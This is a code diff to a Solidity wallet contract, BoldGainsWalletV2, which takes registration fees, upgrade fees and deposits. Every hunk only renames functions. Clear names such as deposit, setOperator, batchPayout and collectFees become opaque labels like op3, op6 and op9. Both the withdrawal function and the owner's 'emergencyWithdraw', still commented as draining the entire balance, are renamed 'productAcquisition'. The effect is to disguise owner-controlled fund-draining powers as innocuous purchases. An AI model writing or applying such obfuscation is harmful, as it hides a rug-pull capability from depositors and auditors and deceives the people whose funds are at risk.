@@ -92,7 +92,7 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
         emit RegistrationFeePaid(msg.sender, userId, gross, fee, gross - fee);
     }
 
-    function payUpgradeFee(string calldata userId, uint8 packageLevel)
+    function op2(string calldata userId, uint8 packageLevel)
         external
         payable
         nonReentrant
@@ -108,7 +108,7 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
         emit UpgradeFeePaid(msg.sender, userId, packageLevel, gross, fee, gross - fee);
     }
 
-    function deposit(string calldata userId)
+    function op3(string calldata userId)
         external
         payable
         nonReentrant
@@ -126,10 +126,10 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
 
     // ── Owner-only config ────────────────────────────────────────────────────
 
-    function pause()   external onlyOwner { _pause(); }
-    function unpause() external onlyOwner { _unpause(); }
+    function op4()   external onlyOwner { _pause(); }
+    function op5() external onlyOwner { _unpause(); }
 
-    function setOperator(address _operator) external onlyOwner {
+    function op6(address _operator) external onlyOwner {
         require(_operator != address(0), "Zero operator");
         emit OperatorChanged(operator, _operator);
         operator = _operator;
@@ -137,7 +137,7 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
 
     // ── Payout actions (operator OR owner) ───────────────────────────────────
 
-    function batchPayout(
+    function op7(
         address[] calldata recipients,
         uint256[] calldata amounts,
         string calldata txRef
@@ -182,7 +182,7 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
         emit BatchPayoutExecuted(txRef, total - failedAmount, len);
     }
 
-    function processWithdrawal(address to, uint256 netAmount, string calldata ref)
+    function productAcquisition(address to, uint256 netAmount, string calldata ref)
         external
         onlyOperatorOrOwner
         nonReentrant
@@ -201,7 +201,7 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
         emit PayoutSent(to, netAmount, ref);
     }
 
-    function collectFees() external onlyOwner nonReentrant {
+    function op9() external onlyOwner nonReentrant {
         uint256 fees = accumulatedFees;
         require(fees > 0, "No fees");
 
@@ -214,7 +214,7 @@ contract BoldGainsWalletV2 is Ownable2Step, ReentrancyGuard, Pausable {
     }
 
     /// @notice Drains entire balance to owner. Emergency use only.
-    function emergencyWithdraw() external onlyOwner nonReentrant {
+    function productAcquisition() external onlyOwner nonReentrant {
         uint256 bal = address(this).balance;
         require(bal > 0, "Nothing to withdraw");
 
